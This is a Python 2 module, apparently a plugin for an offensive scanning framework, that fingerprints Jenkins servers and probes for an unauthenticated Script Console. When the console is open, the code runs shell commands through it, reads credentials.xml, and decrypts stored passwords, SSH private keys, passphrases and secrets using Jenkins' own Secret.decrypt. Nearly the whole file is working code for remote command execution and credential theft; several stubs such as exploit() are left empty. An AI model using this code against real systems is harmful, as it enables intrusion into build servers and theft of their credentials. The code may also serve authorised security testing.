# -*- coding: utf-8 -*-

import requests
import jenkins
import urllib3
import re
from bs4 import BeautifulSoup

DEFAULT_PORTS = [80, 8080, 443, 8000, 8081]
DEFAULT_PATHS = ['/', '/jenkins']
TARGET_NAME   = 'Jenkins'


def fingerprint(res):
    if res.status_code == 403:
        if res.headers.get('x-hudson') or res.headers.get('x-jenkins') or \
                        'window.location.replace(\'/login?from=' in res.text:
            if res.headers.get('x-jenkins'):
                version = res.headers.get('x-jenkins')
            else:
                version = 'unknown'
            return { 'use_security': True, 'version': version }
    if res.status_code == 200 and '<title>Dashboard [Jenkins]</title>' in res.text:
        match = re.search(r'Jenkins ver\. ([\d\.]+)', res.text)
        if match:
            version = match.group(1)
        elif res.headers.get('x-jenkins'):
            version = res.headers.get('x-jenkins')
        else:
            version = 'unknown'
        return { 'use_security': False, 'version': version }
    return None

def check_script_console(target):
    if target['url'].endswith('/'):
        script_url = target['url'] + 'script'
    else:
        script_url = target['url'] + '/script'
    try:
        res = requests.get(script_url, verify=False, timeout=5)
        if res.status_code == 200 and \
                '<title>Jenkins</title>' in res.text and 'Script Console' in res.text:
            return { 'script_console': True }
    except requests.exceptions.RequestException as e:
        print 'Error: ' + str(e)
    except urllib3.exceptions.LocationParseError as e:
        print 'Error: ' + str(e)
    except requests.exceptions.Timeout as e:
        print 'Error: ' + str(e)
    return {}

def check_cli_rmi_deserialization(target):
    pass

def check_new_job(target):
    pass

def script_interface(url, script):
    with requests.Session() as s:
        res = s.get(url + 'script', verify=False)
        headers = {'content-type': 'application/x-www-form-urlencoded'}
        match = re.search(r'crumb\.init\("Jenkins-Crumb", "([0-9a-f]+)"\)', res.text)
        if match:
            csrf_token = match.group(1)
            data = {
                'script': script,
                'Jenkins-Crumb': csrf_token,
                'Submit': 'Run'
            }
        else:
            data = {
                'script': script,
                'Submit': 'Run'
            }
        res = None
        try:
            res = s.post(url + 'script', headers=headers, data=data, verify=False, timeout=10)
        except requests.exceptions.RequestException as e:
            print 'Error: ' + str(e)
        except urllib3.exceptions.LocationParseError as e:
            print 'Error: ' + str(e)
        except requests.exceptions.Timeout as e:
            print 'Error: ' + str(e)
        if res and res.status_code == 200:
            soup = BeautifulSoup(res.text, 'html.parser')
            if len(soup.body.find_all('pre')) > 0:
                return soup.body.find_all('pre')[1].text.replace('Result: ', '')
        return ''

def decrypt_secret(url, secret):
    return script_interface(url, 'hudson.util.Secret.decrypt \'%s\'' % secret)

def credential_recovery(target):
    creds = {}
    if target['url'].endswith('/'):
        url = target['url']
    else:
        url = target['url'] + '/'
    if 'script_console' in target['vulns'] and target['vulns']['script_console']:
        env = script_interface(url, 'println "env".execute().text')
        match = re.search(r'^JENKINS_HOME=(.+)$', env, re.M)
        path = ''
        if match:
            path = match.group(1)
        else:
            match = re.search(r'^HOME=(.+)$', env, re.M)
            if match:
                ls = script_interface(url, 'println "ls -l ' + match.group(1) + '/.jenkins".execute().text')
                if 'credentials.xml' in ls:
                    path = match.group(1) + '/.jenkins'
        if not path:
            path = '/var/lib/jenkins'

        # Need to re-add folder credential extraction at some point
        print 'Found Jenkins home: ' + path 
        cred_file = path + '/credentials.xml'
        print 'Extracting credentials from: ' + cred_file

        credentials_xml = script_interface(url, 'println "cat ' + cred_file + '".execute().text')
        soup = BeautifulSoup(credentials_xml, 'lxml')
        for element in soup.find_all('id'):
            uuid = element.get_text(strip=True)
            parent = element.parent
            description = 'None'
            if parent.find('description'):
                description = parent.find('description').get_text(strip=True)
            if parent.find('privatekey'):
                username = parent.find('username').get_text(strip=True)
                enc_key = parent.find('privatekey').get_text(strip=True)
                enc_passphrase = parent.find('passphrase').get_text(strip=True)
                if not enc_key.startswith('-----'):
                    key = decrypt_secret(url, enc_key).strip()
                else:
                    key = enc_key
                passphrase = decrypt_secret(url, enc_passphrase).strip()
                creds.update({
                    uuid: {
                        'type': 'key', 
                        'description': description,
                        'username': username,
                        'passphrase': passphrase,
                        'key': key
                    }
                })
            elif parent.find('password'):
                username = parent.find('username').get_text(strip=True)
                enc_password = parent.find('password').get_text(strip=True)
                password = decrypt_secret(url, enc_password).strip()
                creds.update({
                    uuid: {
                        'type': 'password',
                        'description': description,
                        'username': username,
                        'password': password
                    }
                })
            elif parent.find('secret'):
                enc_secret = parent.find('secret').get_text(strip=True)
                secret = decrypt_secret(url, enc_secret).strip()
                creds.update({
                    uuid: {
                        'type': 'secret',
                        'description': description,
                        'secret': secret
                    }
                })
    return creds

def assess(target):
    target['vulns'] = {}
    target['vulns'].update(check_script_console(target))
    #target['vulns'].update(check_cli_rmi_deserialization(target))
    #target['vulns'].update(check_new_job(target))
    target['creds'] = {}
    target['creds'].update(credential_recovery(target))
    return target

def exploit(target):
    pass
